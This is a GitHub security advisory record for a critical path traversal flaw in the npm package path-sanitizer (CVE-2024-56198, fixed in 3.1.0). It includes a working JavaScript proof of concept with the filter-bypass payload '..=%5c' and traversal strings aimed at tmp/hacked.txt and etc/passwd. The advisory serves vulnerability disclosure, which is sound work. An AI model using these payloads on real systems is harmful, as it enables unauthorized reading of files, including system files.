{
  "Severity": "CRITICAL",
  "UpdatedAt": "2025-01-02T12:52:43Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "path-sanitizer"
  },
  "Advisory": {
    "DatabaseId": 274120,
    "Id": "GSA_kwCzR0hTQS05NHA1LXI3Y2MtM3Jwcs4ABC7I",
    "GhsaId": "GHSA-94p5-r7cc-3rpr",
    "References": [
      {
        "Url": "https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-56198"
      },
      {
        "Url": "https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead"
      },
      {
        "Url": "https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d"
      },
      {
        "Url": "https://github.com/advisories/GHSA-94p5-r7cc-3rpr"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-94p5-r7cc-3rpr"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-56198"
      }
    ],
    "Description": "### Summary\nThis is a POC for a path-sanitizer [npm package](https://www.npmjs.com/package/path-sanitizer). The filters can be bypassed and can result in path traversal.\n\nPayload: `..=%5c` can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. \n\n### PoC\nHere's the code to test for the filter bypass:\n\n```js\nconst sanitize = require(\"path-sanitizer\")\nconst path = require(\"path\")\nconst fs = require(\"fs\")\n\n// Real scenario:\nfunction routeHandler(myPath) {\n  // Lets just assume that the path was extracted from the request\n  // We want to read a file in the C:\\Users\\user\\Desktop\\myApp\\ directory\n  // But the user should be able to access C:\\Users\\user\\Desktop\\\n  // So we need to sanitize the path\n\n  const APP_DIR = \"/var/hacker\"\n  const sanitized = path.join(APP_DIR, sanitize(myPath))\n\n  // Now we would usally read the file\n  // But in this case we just gonna print the path\n  // console.log(sanitized)\n  return sanitized\n}\n\nfunction readFile(filePath) {\n  const absolutePath = path.resolve(filePath) // Resolve to absolute path\n\n  fs.readFile(absolutePath, \"utf8\", (err, data) =\u003e {\n    if (err) {\n      console.error(`Error reading the file: ${err.message}`)\n      return\n    }\n    console.log(`Contents of the file ${filePath} :\\n${data}`)\n  })\n}\n\ninput_user_bypass = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt\"\n// input_user_bypass = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd\"\ninput_user_payload = \"../../../../../../../../tmp/hacked.txt\"\n\nreadFile(routeHandler(input_user_bypass))\nreadFile(routeHandler(input_user_payload))\n```\n\nHere is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) \n\nhttps://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d\n\n### Impact\nAny CLI tool or library using this package can be/will be vulnerable to Path traversal.\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-01-02T12:52:42Z",
    "Severity": "CRITICAL",
    "Summary": "path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability ",
    "UpdatedAt": "2025-01-02T12:52:43Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.1.0"
      },
      "VulnerableVersionRange": "\u003c 3.1.0"
    }
  ]
}